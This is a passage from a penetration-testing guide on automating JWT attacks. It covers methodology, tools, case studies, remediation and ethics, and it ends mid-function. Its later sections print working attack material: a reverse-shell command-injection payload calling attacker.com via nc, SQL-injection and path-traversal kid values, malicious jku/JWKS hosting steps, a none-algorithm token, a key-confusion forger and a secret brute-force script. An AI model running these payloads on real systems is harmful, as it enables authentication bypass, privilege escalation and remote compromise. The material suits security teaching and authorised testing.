# 19. JWT Testing Automation

## Expert Role

A JWT Testing Automation Specialist is an expert in identifying and exploiting JSON Web Token vulnerabilities through automated testing methodologies. This specialist understands the JWT structure including header, payload, and signature components, and the security implications of improper implementation across different authentication systems. They have deep knowledge of JWT algorithms (HMAC, RSA, ECDSA), key management, and common vulnerabilities including algorithm confusion, key brute-forcing, and token manipulation. The specialist designs automated testing frameworks that systematically test JWT implementations for weaknesses while handling various defensive measures including token validation, key rotation, and algorithm restrictions. They build custom testing engines that adapt to different JWT libraries and bypass techniques. The specialist understands the nuances of different JWT vulnerabilities including none algorithm attacks, key confusion, claim tampering, and JWKS injection, and selects appropriate methods based on token behavior. They maintain comprehensive testing libraries optimized for different JWT libraries, configurations, and bypass requirements. The specialist continuously evolves their testing techniques to address modern defensive measures including strict algorithm validation, key rotation, and JWKS endpoint security. They build automated exploitation chains that combine JWT vulnerabilities with other attack vectors for maximum impact assessment.

## Core Concepts

### What is a JSON Web Token?
JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. JWTs consist of three parts: header, payload, and signature, separated by dots. They are commonly used for authentication and authorization in web applications.

### JWT Structure

1. **Header**: Contains the token type (typ) and signing algorithm (alg). Example: `{"alg":"RS256","typ":"JWT"}`

2. **Payload**: Contains claims (statements about the entity and additional data). Common claims include sub (subject), iss (issuer), exp (expiration), and custom claims like role or user_id.

3. **Signature**: Created by encoding the header and payload with a secret or private key using the specified algorithm. Ensures token integrity and authenticity.

### JWT Algorithms

1. **Symmetric Algorithms (HMAC)**: HS256, HS384, HS512 - Use the same secret key for signing and verification.
2. **Asymmetric Algorithms (RSA)**: RS256, RS384, RS512 - Use a private key for signing and public key for verification.
3. **Asymmetric Algorithms (ECDSA)**: ES256, ES384, ES512 - Use elliptic curve cryptography for signing and verification.
4. **None Algorithm**: No signature verification - Allows tokens to be forged without any cryptographic proof.

### JWT Vulnerabilities

1. **Algorithm Confusion**: Changing JWT header algorithm from asymmetric (RS256) to symmetric (HS256), using the public key as HMAC secret.

2. **None Algorithm Attack**: Exploiting JWT libraries that accept the "none" algorithm, allowing tokens to be forged without signature verification.

3. **Weak HMAC Secret**: Using weak or default HMAC secrets that can be guessed through dictionary attacks or brute-force.

4. **Claim Tampering**: Modifying JWT payload claims (user ID, role, expiration) to gain unauthorized access or escalate privileges.

5. **Signature Stripping**: Removing the JWT signature entirely to test whether the application validates signature presence.

6. **JWKS Injection**: Exploiting JSON Web Key Set endpoints to inject attacker-controlled public keys for algorithm confusion.

7. **Key Rotation Testing**: Testing JWT key rotation mechanisms for vulnerabilities that may allow old keys to be reused or predicted.

8. **Token Replay**: Reusing valid JWTs after they should have expired or been revoked, testing token invalidation mechanisms.

9. **Cross-JWT Confusion**: Exploiting applications that accept JWTs from multiple issuers without proper validation.

10. **JWT Secret Leakage**: Identifying JWT secrets exposed through configuration files, environment variables, or API responses.

### JWT Validation Points

1. **Algorithm Validation**: Ensuring the token algorithm matches expected values.
2. **Signature Verification**: Verifying the token signature against the expected key.
3. **Claim Validation**: Checking expiration, issuer, audience, and custom claims.
4. **Key Management**: Ensuring proper key storage, rotation, and access control.

### Common JWT Locations

1. **Authorization Header**: `Authorization: Bearer <token>` - Standard location for JWT tokens.
2. **Cookies**: JWT stored in HTTP-only or accessible cookies for session management.
3. **URL Parameters**: JWT passed in URL query strings (less secure due to logging).
4. **Form Data**: JWT included in form submission data.

## Prerequisites

1. Strong understanding of JWT structure, algorithms, and security considerations across different implementations and libraries.
2. Knowledge of cryptographic concepts including HMAC, RSA, ECDSA, and their application in JWT signing and verification.
3. Familiarity with JWT libraries across different programming languages (PyJWT, jsonwebtoken, jose4j) and their default configurations.
4. Understanding of web application authentication flows, session management, and OAuth 2.0/OpenID Connect protocols.
5. Proficiency with command-line tools including jwt_tool, custom scripting languages, and cryptographic utilities.
6. Experience with HTTP proxy tools like Burp Suite for intercepting and modifying JWT tokens in requests.
7. Knowledge of key management practices, key rotation mechanisms, and their security implications.
8. Understanding of JWK (JSON Web Key) and JWKS (JSON Web Key Set) specifications for key distribution.
9. Familiarity with OAuth 2.0 and OpenID Connect protocols that use JWTs for authentication and authorization.
10. Basic understanding of web application security models, authentication bypass techniques, and session management vulnerabilities.

## Methodology

### Phase 1: JWT Discovery (15 lines)

Identify all JWT usage in the application through multiple discovery methods. Analyze HTTP requests and responses for JWT tokens in headers, cookies, and URL parameters. Examine JavaScript code for JWT handling, storage, and decoding logic. Test API endpoints for JWT authentication requirements by removing or modifying tokens. Document all JWT-carrying endpoints, token formats, and apparent usage patterns across the application.

### Phase 2: Token Analysis (15 lines)

Analyze discovered JWTs to understand their structure and security properties. Decode JWT header and payload to identify algorithm, key ID, and claims without modifying the token. Analyze token expiration, issuer, and audience claims for validation logic. Test token behavior across different endpoints and user roles. Document token structure, claims, validation patterns, and any observed security configurations.

### Phase 3: Algorithm Testing (10 lines)

Test JWT algorithm validation for confusion vulnerabilities. Attempt to change algorithm from asymmetric to symmetric (RS256 to HS256). Test "none" algorithm acceptance with empty and non-empty signatures. Verify algorithm validation across different endpoints and token types. Document algorithm validation behavior and any bypass opportunities discovered.

### Phase 4: Key Security Testing (15 lines)

Test JWT key security for weaknesses and misconfigurations. Attempt HMAC secret brute-forcing using common password lists and rule-based attacks. Test for key leakage through configuration files, API responses, or error messages. Analyze JWKS endpoints for key injection, SSRF, or other vulnerabilities. Test key rotation mechanisms for vulnerabilities that may allow key reuse or prediction. Document key security posture and any weaknesses discovered.

### Phase 5: Claim Manipulation (15 lines)

Test JWT claim validation for tampering vulnerabilities. Modify user ID, role, and privilege claims to test authorization bypass. Test expiration and not-before claim validation to test token lifetime enforcement. Attempt to inject additional claims that may affect application behavior. Test issuer and audience claim validation to test cross-tenant or cross-application attacks. Document claim validation behavior and bypass opportunities.

### Phase 6: Reporting and Remediation (10 lines)

Document the complete JWT security assessment including vulnerabilities discovered and exploitation techniques. Generate comprehensive reports with reproduction steps, risk assessment, and remediation recommendations. Prepare executive summaries for non-technical stakeholders and detailed technical reports for development teams. Provide specific guidance for implementing secure JWT practices and key management.

## Tool Arsenal

### Primary JWT Testing Tools

1. **jwt_tool**: Comprehensive JWT testing toolkit with support for algorithm confusion, key brute-forcing, claim manipulation, and JWKS testing.

2. **Burp Suite JWT Extensions**: Multiple extensions including JWT Editor and JSON Web Tokens for manual and automated testing with token manipulation capabilities.

3. **OWASP ZAP JWT Support**: Open-source security testing tool with JWT handling capabilities through scripts and extensions for automated scanning.

4. **Custom JWT Scanner**: Scripts for automated JWT vulnerability detection and exploitation with customizable payload generation and validation testing.

5. **JWT Inspector**: Browser extension for analyzing JWT tokens in web application traffic with real-time decoding and modification.

### Algorithm Testing Tools

6. **Algorithm Confusion Tester**: Tools for testing JWT algorithm confusion vulnerabilities between asymmetric and symmetric algorithms with key confusion attacks.

7. **None Algorithm Tester**: Tools for testing JWT "none" algorithm acceptance and bypass with various payload formats and signature options.

8. **Algorithm Validation Analyzer**: Tools for analyzing JWT algorithm validation logic and identifying weaknesses in algorithm checking implementations.

9. **Key Type Tester**: Tools for testing JWT key type validation and identifying confusion opportunities between symmetric and asymmetric keys.

10. **Signature Verification Tester**: Tools for testing JWT signature verification completeness and accuracy across different validation points.

### Key Security Tools

11. **HMAC Key Brute-Forcer**: Tools for brute-forcing HMAC secrets using common password lists, rule-based attacks, and distributed computing.

12. **RSA Key Analyzer**: Tools for analyzing RSA key security and identifying weak key implementations, small key sizes, or predictable parameters.

13. **ECDSA Key Tester**: Tools for testing ECDSA key security and implementation weaknesses including curve vulnerabilities and nonce reuse.

14. **Key Leakage Scanner**: Scripts for scanning configuration files, API responses, and error messages for leaked JWT secrets and key material.

15. **JWKS Analyzer**: Tools for analyzing JSON Web Key Set endpoints for key injection vulnerabilities, SSRF, and unauthorized key access.

### Claim Manipulation Tools

16. **Claim Modifier**: Tools for modifying JWT claims and testing validation logic with support for different claim types and encoding.

17. **Claim Injection Tester**: Tools for testing JWT claim injection vulnerabilities and bypass techniques including nested claims and custom claim types.

18. **Expiration Bypass Tester**: Tools for testing JWT expiration and not-before claim validation bypass with timestamp manipulation and clock skew testing.

19. **Privilege Escalation Tester**: Tools for testing JWT privilege escalation through claim manipulation including role injection and permission escalation.

20. **Token Replay Tester**: Tools for testing JWT token replay and revocation mechanisms with support for token lifetime and revocation list testing.

### Token Analysis Tools

21. **JWT Decoder**: Tools for decoding and analyzing JWT structure, claims, and signatures with support for all standard claim types.

22. **JWT Validator**: Tools for validating JWT structure, signature, and claims against RFC specifications and security best practices.

23. **Token Pattern Analyzer**: Tools for analyzing JWT usage patterns across application endpoints for authentication flow mapping.

24. **Cookie Analyzer**: Tools for analyzing JWT storage in cookies and identifying security issues including Secure, HttpOnly, and SameSite flags.

25. **Header Analyzer**: Tools for analyzing JWT usage in HTTP headers and identifying exposure risks in logs, referrers, and browser storage.

### Custom Scripting Frameworks

26. **Python PyJWT**: Python JWT library for building custom JWT testing scripts with support for multiple algorithms and claim manipulation.

27. **Node.js jsonwebtoken**: Node.js JWT library for building custom JWT testing tools with token generation and validation capabilities.

28. **Go jwt-go**: Go JWT library for building high-performance JWT testing frameworks with concurrent testing support.

29. **Ruby JWT**: Ruby JWT library for building quick JWT testing prototypes with rapid development and testing capabilities.

30. **Java JJWT**: Java JWT library for building custom JWT testing tools with support for enterprise JWT implementations.

### Cryptographic Analysis Tools

31. **Hash Identifier**: Tools for identifying hash algorithms used in JWT signatures for algorithm confusion attack planning.

32. **Key Strength Analyzer**: Tools for analyzing cryptographic key strength and identifying weaknesses in key generation and storage.

33. **Signature Verification Tools**: Tools for manually verifying JWT signatures and testing algorithm implementations with custom key material.

34. **Cryptographic Oracle Tester**: Tools for testing JWT implementations for cryptographic oracle vulnerabilities including padding oracle and timing attacks.

35. **Timing Attack Tools**: Tools for testing JWT implementations for timing-based side-channel vulnerabilities in signature verification.

### Reporting and Documentation Tools

36. **Screenshot Automation**: Tools for capturing evidence of JWT vulnerability exploitation with annotation and timestamp support.

37. **PoC Generator**: Scripts for generating proof-of-concept demonstrations for discovered JWT vulnerabilities with token manipulation examples.

38. **Token Flow Diagram Generator**: Tools for visualizing JWT token flow and validation logic for vulnerability documentation.

39. **Report Templates**: Standardized templates for documenting JWT vulnerabilities with technical details and remediation guidance.

40. **Impact Assessment Tools**: Scripts for evaluating the potential impact of discovered JWT vulnerabilities including authentication bypass and data exposure.

## Case Studies

### Case Study 1: Algorithm Confusion Attack (20 lines)

A web application implemented JWT authentication using RS256 (RSA with SHA-256) for token signing. The application's JWT validation accepted any algorithm specified in the token header without restrictions on allowed algorithms. The vulnerability was discovered through automated testing with jwt_tool, which identified that changing the algorithm from RS256 to HS256 caused the application to use the RSA public key as the HMAC secret. The attacker obtained the public key from the JWKS endpoint (`/.well-known/jwks.json`) and used it to forge valid HMAC-signed tokens with arbitrary claims including admin role. The exploitation enabled complete authentication bypass and privilege escalation to administrator. The attacker accessed all administrative functions and sensitive data. Impact: Full authentication bypass and administrative access through algorithm confusion affecting all application data. Remediation: Implemented strict algorithm validation that only accepts the configured algorithm (RS256), rejected algorithm changes in token headers, and added JWKS endpoint access controls.

### Case Study 2: None Algorithm Bypass (20 lines)

A Node.js application implemented JWT authentication using the jsonwebtoken library with default settings. The application did not explicitly configure algorithm validation, allowing the "none" algorithm to be accepted. The vulnerability was identified through automated testing with custom scripts that modified JWT headers to use algorithm "none" with an empty signature. The attacker forged tokens with arbitrary claims including admin role and valid user IDs, which were accepted by the application without signature verification. The exploitation enabled access to any user account without knowledge of credentials. The attacker accessed all user accounts and sensitive application data. Impact: Complete authentication bypass affecting all user accounts through none algorithm acceptance. Remediation: Updated JWT configuration to explicitly specify allowed algorithms (RS256), disabled "none" algorithm acceptance, and implemented strict algorithm validation in all token verification paths.

### Case Study 3: HMAC Secret Brute-Force (20 lines)

A web application implemented JWT authentication using HS256 with a weak HMAC secret derived from a common password. The application used a short, predictable secret that could be guessed through dictionary attacks. The vulnerability was discovered through automated brute-forcing with jwt_tool using common password lists and rule-based mutations. The secret was cracked within minutes using a standard password dictionary, enabling token forgery for any user including administrators. The attacker created administrator tokens and accessed sensitive application data including user PII, financial records, and system configuration. Impact: Administrative access through weak HMAC secret compromise affecting all application data and user privacy. Remediation: Implemented strong, randomly generated HMAC secrets with sufficient entropy (256-bit minimum), added key rotation mechanisms, and migrated to asymmetric algorithms for production use.

### Case Study 4: JWKS Injection (20 lines)

A cloud-hosted application implemented JWT authentication using JWKS endpoints for key distribution. The application fetched JWKS from a URL parameter that could be controlled by the user instead of using a fixed, trusted endpoint. The vulnerability was identified through automated testing that identified the JWKS URL parameter as controllable. The attacker hosted a malicious JWKS endpoint on their server containing an RSA public key corresponding to a private key they controlled. The attacker manipulated the application to fetch keys from the attacker's endpoint, then signed tokens with the corresponding private key. These tokens were accepted by the application as valid. Impact: Complete authentication bypass through JWKS endpoint manipulation affecting all user accounts and application data. Remediation: Implemented fixed JWKS endpoints hardcoded in the application, removed user control over key source URLs, and added JWKS endpoint validation and caching.

### Case Study 5: Token Replay with Weak Expiration (20 lines)

A mobile application implemented JWT authentication with tokens that had excessively long expiration times (30 days) and no token revocation mechanism. The application accepted tokens without checking against a revocation list or validating token freshness beyond the expiration claim. The vulnerability was identified through token analysis and testing that demonstrated tokens remained valid long after user logout. The attacker captured a valid token from a test account and used it for 30 days without re-authentication, even after the legitimate user had logged out. The exploitation demonstrated the impact of weak token lifecycle management. Impact: Long-term unauthorized access through token replay affecting user account security. Remediation: Implemented shorter token expiration times (1 hour), added refresh token mechanism, implemented token revocation list, and added server-side session management.

## Bypass Techniques

1. **Algorithm Downgrade**: Changing JWT algorithm from stronger (RS256) to weaker (HS256) or none, exploiting improper algorithm validation and missing algorithm whitelists.

2. **Key Confusion**: Using public keys as HMAC secrets to forge valid signatures when algorithm validation is bypassed through algorithm confusion vulnerabilities.

3. **None Algorithm Exploitation**: Using the "none" algorithm to create tokens without signatures when the library accepts it due to default configurations or missing validation.

4. **Claim Injection**: Injecting additional claims (role, permissions, admin) that are not properly validated by the application's authorization logic.

5. **Expiration Bypass**: Manipulating or removing expiration claims to extend token validity beyond intended limits through timestamp manipulation or clock skew exploitation.

6. **Signature Stripping**: Removing the JWT signature entirely (sending only header.payload) to test whether signature presence is validated by the application.

7. **JWKS URL Manipulation**: Changing JWKS endpoint URLs to attacker-controlled servers containing malicious keys for algorithm confusion attacks.

8. **Key ID Injection**: Injecting custom key IDs (kid) to exploit key selection logic vulnerabilities that may load keys from untrusted sources.

9. **Token Replay**: Reusing valid tokens after they should have expired or been revoked, exploiting weak token lifecycle management.

10. **Cross-JWT Confusion**: Exploiting applications that accept tokens from multiple issuers without proper issuer validation and audience checking.

11. **Header Injection**: Injecting additional headers (jku, x5u) that may affect JWT processing or validation through external key loading.

12. **Payload Manipulation**: Modifying JWT payload claims to escalate privileges or bypass authorization through claim injection and validation bypass.

13. **Timing Attacks**: Using timing variations in JWT validation to infer information about the secret or key through side-channel analysis.

14. **Error Message Analysis**: Analyzing JWT validation error messages for information disclosure about validation logic, key material, or algorithm processing.

15. **Token Leakage Exploitation**: Exploiting JWT tokens leaked through logs, referrer headers, browser history, or other channels for unauthorized access.

## Advanced Techniques

1. **Automated JWT Security Assessment**: Build frameworks that automatically test JWT implementations for all known vulnerabilities including algorithm confusion, key weakness, claim validation, and JWKS security.

2. **Machine Learning Token Analysis**: Train ML models to analyze JWT patterns and identify potential vulnerabilities based on token structure, usage patterns, and validation behavior.

3. **JWT in OAuth/OIDC Testing**: Develop specialized testing for JWTs used in OAuth 2.0 and OpenID Connect flows where vulnerabilities may affect authentication and authorization across distributed systems.

4. **JWT Key Rotation Testing**: Develop automated testing for JWT key rotation mechanisms to identify vulnerabilities in key lifecycle management, key reuse, and rotation timing.

5. **JWT Chain Detection**: Develop tools for identifying JWT vulnerabilities that can be chained with other vulnerabilities (IDOR, XSS, SSRF) for maximum impact assessment.

6. **JWT in Microservices**: Develop specialized testing for JWTs used in microservice architectures where token validation may be inconsistent across services and authentication boundaries.

7. **JWT Impact Quantification**: Develop tools for quantifying the business impact of JWT vulnerabilities including authentication bypass scope and data exposure metrics.

8. **JWT Defense Validation**: Build tools for validating the effectiveness of JWT security implementations and identifying bypass techniques for specific library configurations.

9. **JWT in Serverless**: Develop testing for JWT implementations in serverless architectures (AWS Lambda, Azure Functions) where token handling may have different security implications.

10. **JWT Compliance Testing**: Develop tools for testing JWT implementations against security standards (OWASP, NIST) and best practices for authentication token security.

## Detection Indicators

1. **Algorithm Changes Accepted**: Application accepts JWT with algorithm different from expected, indicating algorithm confusion vulnerability and missing algorithm validation.

2. **None Algorithm Accepted**: Application accepts JWT with "none" algorithm, indicating signature validation bypass and missing signature verification.

3. **Claim Modification Accepted**: Application accepts modified JWT claims, indicating insufficient claim validation and authorization bypass.

4. **Weak Key Detection**: JWT HMAC secret cracked through brute-force, indicating weak key implementation and insufficient entropy.

5. **JWKS URL Manipulation**: Application accepts JWKS from user-controlled URLs, indicating key injection vulnerability and SSRF potential.

6. **Token Replay Success**: Expired or revoked JWT accepted by application, indicating token invalidation weakness and lifecycle management issues.

7. **Error Message Disclosure**: JWT validation errors reveal information about validation logic, key material, or algorithm processing through verbose error messages.

8. **Timing Variations**: Different response times for valid vs invalid JWTs, indicating validation processing differences that may enable timing attacks.

9. **Key Leakage Indicators**: JWT secrets exposed in configuration files, API responses, error messages, or client-side code indicating insecure key management.

10. **Token Storage Issues**: JWTs stored insecurely in cookies (missing Secure/HttpOnly flags), localStorage, or other client-side storage mechanisms.

## Common Pitfalls

1. **Incomplete Algorithm Validation**: Not testing for algorithm confusion when the application appears to use a specific algorithm, missing algorithm downgrade vulnerabilities.

2. **Ignoring None Algorithm**: Assuming "none" algorithm is not accepted without explicit testing, missing signature validation bypass opportunities.

3. **Weak Key Assumptions**: Assuming HMAC secrets are strong without testing for common passwords, patterns, and dictionary words through brute-force.

4. **Missing Claim Validation**: Not testing for claim manipulation when token structure appears correct, missing authorization bypass through claim injection.

5. **Overlooking JWKS Issues**: Not testing JWKS endpoints for injection, SSRF, or manipulation vulnerabilities that may enable key confusion attacks.

6. **Aggressive Testing Disruption**: Performing JWT testing that causes authentication system disruption, account lockouts, or service degradation.

7. **Inadequate Impact Assessment**: Not fully assessing the impact of JWT vulnerabilities including full authentication bypass, privilege escalation, and data exposure.

8. **Neglecting Token Storage**: Not testing JWT storage mechanisms (cookies, localStorage, sessionStorage) for security vulnerabilities and exposure risks.

9. **Incomplete Evidence Collection**: Not capturing sufficient evidence of JWT vulnerability exploitation including token manipulation, validation bypass, and impact demonstration.

10. **Missing Chain Opportunities**: Failing to chain JWT vulnerabilities with other attack vectors (IDOR, XSS, SSRF) for maximum impact assessment.

## Integration Points

1. **CI/CD Pipeline Integration**: Implement automated JWT testing in continuous integration pipelines to detect vulnerabilities during development and prevent deployment of insecure authentication implementations.

2. **Authentication System Integration**: Integrate JWT testing with authentication system monitoring to identify real-time exploitation attempts and suspicious token usage patterns.

3. **WAF Rule Development**: Use JWT detection patterns to develop WAF rules that can detect and block automated JWT exploitation attempts including algorithm manipulation and token forgery.

4. **SIEM Integration**: Feed JWT detection logs into Security Information and Event Management systems for correlation with other security events and threat detection.

5. **Vulnerability Management Platform**: Integrate JWT findings with vulnerability management systems for tracking remediation progress and prioritizing authentication security fixes.

6. **Penetration Testing Framework**: Incorporate JWT automation into penetration testing methodologies to improve efficiency and coverage of authentication security testing.

7. **Compliance Monitoring**: Use JWT detection results to demonstrate compliance with authentication and authorization standards including OWASP, NIST, and PCI DSS.

8. **Threat Hunting Integration**: Incorporate JWT detection patterns into threat hunting playbooks to identify potential authentication bypass attempts and token manipulation.

9. **Incident Response Integration**: Use JWT detection capabilities to support incident response activities involving authentication security, token theft, and unauthorized access.

10. **Security Training**: Use JWT findings and automation examples to train development teams on secure JWT implementation practices and authentication security.

## Reporting Templates

### Template 1: Executive Summary

**Title**: JWT Vulnerability in [Application] [Component]
**Severity**: [Critical/High/Medium/Low]
**CVSS Score**: [Score]
**Affected Components**: [List of affected endpoints]
**Business Impact**: [Description of business risk and potential authentication bypass]
**Remediation Priority**: [Immediate/High/Medium/Low]

### Template 2: Technical Details

**Vulnerability Type**: [Algorithm Confusion/None Algorithm/Key Weakness/Claim Tampering/JWKS Injection]
**JWT Algorithm**: [RS256/HS256/ES256/none/etc.]
**Vulnerable Component**: [Validation library/endpoint/middleware]
**Prerequisites**: [Required access level]
**Reproduction Steps**: [Step-by-step instructions]
**Payload Examples**: [Sample JWTs demonstrating vulnerability]
**Evidence**: [Request/response pairs with annotations]

### Template 3: Impact Assessment

**Authentication Bypass**: [Assessment of authentication bypass risk and scope]
**Authorization Bypass**: [Assessment of authorization bypass and privilege escalation]
**Data at Risk**: [Types of data accessible through exploitation]
**Session Hijacking**: [Assessment of session compromise risk and persistence]
**Privilege Escalation**: [Assessment of privilege elevation opportunities]

### Template 4: Remediation Recommendations

**Immediate Actions**: [Quick fixes to implement]
**Long-term Solutions**: [Architectural improvements]
**Algorithm Validation**: [Recommended algorithm validation practices]
**Key Management**: [Key generation, rotation, and storage recommendations]
**Claim Validation**: [Claim validation and sanitization guidance]

## Practice Labs

1. **PortSwigger JWT Labs**: Complete PortSwigger's JWT labs covering algorithm confusion, none algorithm, claim manipulation, and JWKS vulnerabilities with guided solutions.

2. **HackTheBox JWT Challenges**: Practice JWT exploitation on HackTheBox challenges requiring advanced techniques including key recovery, algorithm confusion, and authentication bypass.

3. **OWASP Juice Shop JWT**: Test JWT vulnerabilities in OWASP Juice Shop including algorithm confusion, weak secrets, and token manipulation with real-world scenarios.

4. **JWT Security Playground**: Online labs for practicing JWT manipulation and testing various bypass techniques in a controlled environment.

5. **Custom JWT Lab**: Build a vulnerable web application with intentional JWT vulnerabilities across multiple libraries and configurations to practice automated testing framework development.

## Ethics

1. Always obtain proper authorization before testing for JWT vulnerabilities on any system or authentication endpoint.
2. Minimize authentication system impact during testing by avoiding account lockouts, service disruption, or user enumeration.
3. Do not exfiltrate or store any user data discovered through JWT exploitation beyond what is necessary for vulnerability demonstration.
4. Report all discovered JWT vulnerabilities through responsible disclosure channels immediately with complete technical details.
5. Provide clear remediation guidance to help organizations fix identified vulnerabilities and prevent future exploitation.
6. Respect rate limits and do not perform aggressive key brute-forcing without explicit permission from system owners.
7. Do not share or publish specific exploitation details for real-world JWT vulnerabilities without proper authorization.
8. Consider the potential impact of testing activities on authentication system availability and user access.
9. Maintain strict confidentiality of all vulnerability information discovered during authorized testing activities.
10. Follow all applicable laws and regulations regarding unauthorized access to computer systems and authentication mechanisms.
11. Use test accounts for JWT manipulation validation whenever possible to avoid affecting real user accounts.
12. Avoid disrupting authentication services during testing that may impact legitimate user access.
13. Document all testing activities for accountability, knowledge transfer, and compliance with engagement requirements.

## Quick Reference

### Common JWT Vulnerabilities
- Algorithm confusion: RS256 → HS256 (public key as HMAC secret)
- None algorithm: alg: "none" (no signature verification)
- Weak HMAC secret: Common passwords, short keys, predictable patterns
- Claim tampering: role, user_id, admin modification
- JWKS injection: User-controlled key source URLs
- Token replay: Expired/revoked tokens accepted
- Key leakage: Secrets in config files, responses, client code

### Testing Checklist
- [ ] Identify all JWT usage (headers, cookies, URLs)
- [ ] Analyze token structure (header, payload, signature)
- [ ] Test algorithm validation (confusion, none, downgrade)
- [ ] Test none algorithm acceptance with various payloads
- [ ] Test HMAC secret strength (dictionary, brute-force)
- [ ] Test claim validation (role, expiration, issuer)
- [ ] Test JWKS endpoints (injection, SSRF, manipulation)
- [ ] Test token revocation and lifecycle management
- [ ] Test key rotation mechanisms
- [ ] Document findings and impact with evidence

### Bypass Techniques Quick List
- Algorithm downgrade (RS256 → HS256)
- Key confusion attack (public key as HMAC secret)
- None algorithm exploitation (empty signature)
- Claim injection (role, permissions, admin)
- Expiration bypass (timestamp manipulation)
- JWKS URL manipulation (attacker-controlled endpoint)
- Key ID injection (kid parameter exploitation)
- Token replay (expired/revoked tokens)
- Header injection (jku, x5u manipulation)

### Impact Assessment Matrix
- Full authentication bypass = Critical
- Privilege escalation = High
- Session hijacking = High
- Data exposure = Medium
- Information disclosure = Low/Medium
- Token replay = Medium/High

### Tools Quick Reference
- jwt_tool: Primary JWT testing and exploitation
- Burp Suite: Manual analysis and token manipulation
- Custom scripts: Algorithm testing and key brute-force
- JWT decoders: Token analysis and structure inspection
- Brute-force tools: Key recovery and secret cracking

---

## Deep Dive: JWT Attack Chains

### Algorithm Confusion Full Chain
```
Step 1: Identify signing algorithm
- Decode JWT header: {"alg":"RS256","typ":"JWT"}
- RS256 = RSA with SHA-256 (asymmetric)
- Server uses private key to sign, public key to verify

Step 2: Obtain public key
- JWKS endpoint: /.well-known/jwks.json
- Certificate endpoint: /.well-known/openid-configuration
- X.509 certificate in JWT header (x5c parameter)

Step 3: Convert public key to HMAC secret
- PEM public key bytes become HMAC-SHA256 secret
- Tool: jwt_tool with -X k command

Step 4: Forge token with HS256
- Set header: {"alg":"HS256","typ":"JWT"}
- Sign with public key bytes as secret
- Server validates with same public key (confusion!)

Step 5: Privilege escalation
- Modify claims: {"role":"admin","user":"victim"}
- Sign with HS256 using public key
- Server accepts as valid admin token
```

### JWKS Injection Chain
```
Step 1: Discover JWKS endpoint
GET /.well-known/jwks.json
{
  "keys": [{
    "kty": "RSA",
    "kid": "original-key-id",
    "n": "original-modulus...",
    "e": "AQAB"
  }]
}

Step 2: Generate attacker key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

Step 3: Host malicious JWKS
https://attacker.com/.well-known/jwks.json
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key-id",
    "n": "attacker-modulus...",
    "e": "AQAB"
  }]
}

Step 4: Modify JWT header
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json","kid":"attacker-key-id"}

Step 5: Sign with attacker private key
- Server fetches attacker JWKS
- Verifies token with attacker public key
- Token accepted as valid
```

### Kid Parameter Injection Chain
```
Step 1: Identify kid usage
- Header contains: {"kid":"key-identifier"}
- Server uses kid to select verification key

Step 2: Path traversal via kid
{"kid":"/dev/null","alg":"HS256"}
- Server reads /dev/null as verification key
- Empty key = HMAC with empty secret

Step 3: Sign with empty string
- Token signed with HMAC using "" as secret
- Server verifies with /dev/null (empty)
- Signature matches!

Step 4: SQL injection via kid
{"kid":"key1' UNION SELECT 'attacker-key'--","alg":"HS256"}
- Server queries database with kid
- SQL injection returns attacker-controlled key
- Sign with injected key value

Step 5: Command injection via kid
{"kid":"key`; nc attacker.com 4444 -e /bin/sh`","alg":"HS256"}
- Server executes command with kid
- Reverse shell established
```

### None Algorithm Attack Chain
```
Step 1: Decode token
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

Step 2: Modify header
{"alg":"none","typ":"JWT"}

Step 3: Modify claims
{"user":"admin","role":"administrator"}

Step 4: Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

Step 5: Send to server
- Some implementations accept alg:none
- Signature verification skipped
- Token accepted as valid
```

### JKU/X5U Header Injection
```
Step 1: Identify header usage
- jku: JWK Set URL (JSON Web Key Set)
- x5u: X.509 URL (certificate chain)

Step 2: Host malicious endpoint
https://attacker.com/jku.json
{
  "keys": [{
    "kty": "RSA",
    "kid": "evil-key",
    "n": "attacker-modulus...",
    "e": "AQAB"
  }]
}

Step 3: Modify JWT header
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jku.json","kid":"evil-key"}

Step 4: Sign with attacker private key
- Server fetches attacker JWKS
- Verifies with attacker public key
- Token accepted
```

---

## Advanced JWT Attacks

### JWT Token Confusion (Key Confusion)
```python
# Attack: Use public key as HMAC secret
# Vulnerability: Server uses RS256 but accepts HS256

import jwt
import requests

def key_confusion_attack(token: str, public_key_pem: str) -> str:
    """Forge token using public key as HMAC secret"""
    # Decode original token
    header, payload, _ = token.split('.')
    
    # Modify header to HS256
    import base64
    new_header = base64.urlsafe_b64encode(
        b'{"alg":"HS256","typ":"JWT"}'
    ).rstrip(b'=').decode()
    
    # Create new payload
    new_payload = base64.urlsafe_b64encode(
        b'{"user":"admin","role":"admin"}'
    ).rstrip(b'=').decode()
    
    # Sign with public key bytes as HMAC secret
    message = f"{new_header}.{new_payload}"
    signature = jwt.encode(
        {},
        public_key_pem,
        algorithm='HS256'
    )
    
    return f"{new_header}.{new_payload}.{signature}"

# Usage
public_key = requests.get('https://target.com/.well-known/jwks.json').text
forged = key_confusion_attack(original_token, public_key)
```

### JWT Secret Brute-Force
```python
#!/usr/bin/env python3
"""JWT secret brute-force attack"""

import jwt
import sys
from itertools import product

def brute_force_jwt(token: str, wordlist: str):
    """Brute-force JWT HMAC secret"""
    with open(wordlist, 'r') as f:
        for line in f:
            secret = line.strip()
            try:
                decoded = jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                print(f"[+] Secret found: {secret}")
                print(f"[+] Decoded: {decoded}")
                return secret
            except jwt.InvalidSignatureError:
                continue
            except Exception as e:
                continue
    print("[-] Secret not found in wordlist")
    return None

def wordlist_attack(token: str, wordlist_path: str):
    """Main brute-force function"""
    print(f"[*] Starting brute-force on: {token[:50]}...")
    return brute_force_jwt(token, wordlist_path)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <token> <wordlist>")
        sys.exit(1)
    wordlist_attack(sys.argv[1], sys.argv[2])
```

### JWT Claim Manipulation
```python
# Attack: Modify claims to escalate privileges

import base64
import json

def manipulate_claims(token: str) -> str:
    """Modify JWT claims for privilege escalation"""
